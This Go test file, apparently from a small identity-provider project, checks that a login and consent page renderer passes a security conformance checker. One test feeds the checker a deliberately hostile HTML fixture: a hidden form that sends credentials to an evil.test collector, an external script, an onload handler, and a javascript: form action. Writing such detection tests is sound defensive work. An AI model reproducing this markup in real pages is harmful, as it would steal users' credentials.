package idpuitest_test

import (
	"context"
	"io"
	"strings"
	"testing"

	"github.com/go-go-golems/tiny-idp/pkg/idpui"
	"github.com/go-go-golems/tiny-idp/pkg/idpui/idpuitest"
)

type rendererFunc func(context.Context, io.Writer, idpui.InteractionPage) error

func (f rendererFunc) RenderInteraction(ctx context.Context, dst io.Writer, page idpui.InteractionPage) error {
	return f(ctx, dst, page)
}

func TestDefaultRendererConforms(t *testing.T) {
	renderer, err := idpui.NewDefaultRenderer()
	if err != nil {
		t.Fatal(err)
	}
	_, violations, err := idpuitest.RenderAndCheck(context.Background(), renderer, conformancePage())
	if err != nil {
		t.Fatal(err)
	}
	if len(violations) != 0 {
		t.Fatalf("default renderer violations: %v", violations)
	}
}

func TestConformanceFindsSecurityAndProtocolViolations(t *testing.T) {
	page := conformancePage()
	renderer := rendererFunc(func(_ context.Context, dst io.Writer, _ idpui.InteractionPage) error {
		_, err := io.WriteString(dst, `<!doctype html><html><body onload="steal()"><style>x{}</style><script src="https://evil.test/x.js"></script><form style="display:none" method="get" action="https://evil.test/collect"><input type="hidden" name="interaction" value="wrong"><input type="hidden" name="redirect_uri" value="https://evil.test"><input id="tinyidp-login" name="login"><input id="tinyidp-password" type="password" name="password" value="secret"><button name="action" value="approve" formaction="javascript:steal()">Approve</button></form></body></html>`)
		return err
	})
	_, violations, err := idpuitest.RenderAndCheck(context.Background(), renderer, page)
	if err != nil {
		t.Fatal(err)
	}
	joined := make([]string, 0, len(violations))
	for _, violation := range violations {
		joined = append(joined, violation.String())
	}
	all := strings.Join(joined, "\n")
	for _, rule := range []string{"active-content", "event-handler", "inline-style", "dangerous-url", "external-origin", "protocol-field", "password-retention", "form-contract", "action-contract", "input-label", "autocomplete"} {
		if !strings.Contains(all, rule+":") {
			t.Errorf("missing %s finding:\n%s", rule, all)
		}
	}
}

func conformancePage() idpui.InteractionPage {
	return idpui.InteractionPage{
		DocumentTitle: "Sign in and approve access",
		Form: idpui.InteractionForm{
			ActionURL:        "https://app.example.test/idp/authorize",
			InteractionField: idpui.InteractionFieldName,
			Interaction:      "interaction",
			CSRFField:        idpui.CSRFFieldName,
			CSRFToken:        "csrf",
			ActionField:      idpui.ActionFieldName,
			Actions:          []idpui.Action{idpui.ActionApprove, idpui.ActionDeny},
		},
		Login:   &idpui.LoginPrompt{Reason: idpui.LoginReasonSessionMissing, LoginField: idpui.LoginFieldName, PasswordField: idpui.PasswordFieldName},
		Consent: &idpui.ConsentPrompt{ClientID: "tinyidp-xapp", Scopes: []idpui.Scope{{Name: "openid"}}},
		Error:   &idpui.PublicError{Code: idpui.ErrorInvalidCredentials, Field: idpui.FieldCredentials, Summary: "Invalid login or password."},
	}
}
